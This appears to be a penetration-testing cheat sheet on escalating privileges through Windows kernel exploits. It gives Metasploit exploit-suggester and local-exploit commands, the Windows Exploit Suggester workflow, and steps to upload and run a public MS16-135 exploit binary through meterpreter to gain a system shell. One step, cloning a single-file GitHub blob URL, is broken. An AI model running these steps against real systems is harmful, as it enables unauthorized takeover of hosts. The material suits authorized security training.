# Windows Kernel Exploits

## Explanation

- A Kernel is a computer program that is the core of an operating system and has complete control over every resource and hardware on a system. It acts as a translation layer between hardware and software and facilitates the communication between these two layers.

- Windows NT is the kernel that comes pre-packaged with all versions of Microsoft Windows and operates as a traditional kernel with a few exceptions based on user design philosophy. It consists of two main modes of operation that determine access to system resources and hardware : 
    - User Mode : Programs and services running in user mode have limited access to system resources and functionality.
    - Kernel Mode : Kernel mode has unrestricted access to system resources and functionality with the added functionality of managing devices and system memory.

- Kernel exploits on Windows will tipically target vulnerabilities in the Windows kernel to execute arbitrary code in order to run privileged system commands or to obtain a system shell.

- This process will differ based on the version of Windows being targeted and the kernel exploit being used.

- Privilege escalation on Windows systems will typically follow the following methodology : 
    - Identifying kernel vulnerabilities.
    - Downloading, compiling and transferring kernel exploits onto the target system.

## With Metasploit Framework

### Check a system for local vulnerabilities

```
msfconsole
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > sessions
msf6 > set SESSION <number>
msf6 > run
```

### Run local exploit with Metasploit framework

```
msf6 > use exploit/windows/local/ms16_014_wmi_recv_notif
msf6 > set SESSION <number>
msf6 > set LPORT <port>
msf6 > run
meterpreter > getuid
meterpreter > shell
```

## With Windows Exploit Suggester

1. Clone this project : 
https://github.com/AonCyberLabs/Windows-Exploit-Suggester

2. Run systeminfo command in your target host : 
```
C:\Temp>systeminfo
```

3. Copy/paste the systeminfo results in your Kali : 
```
cd /tmp
vim win7.txt
```

4. Run python script with your new txt file : 
```
python3 windows-exploit-suggester.py --database 2021-12-26-mssb.xls --systeminfo /tmp/win7.txt
```

5. Check vulnerabilities, and upload exploit in your target host, for example : https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-135/41015.exe

```
cd /tmp
git clone https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-135/41015.exe
msfconsole
msf6 > sessions
msf6 > sessions <number>
meterpreter > cd Temp\\
meterpreter > upload /tmp/windows-kernel-exploits/MS16-135/41015.exe
```
6. Run exploit : 
```
meterpreter > shell
C:\Temp> .\41015.exe
C:\Temp> whoami
```
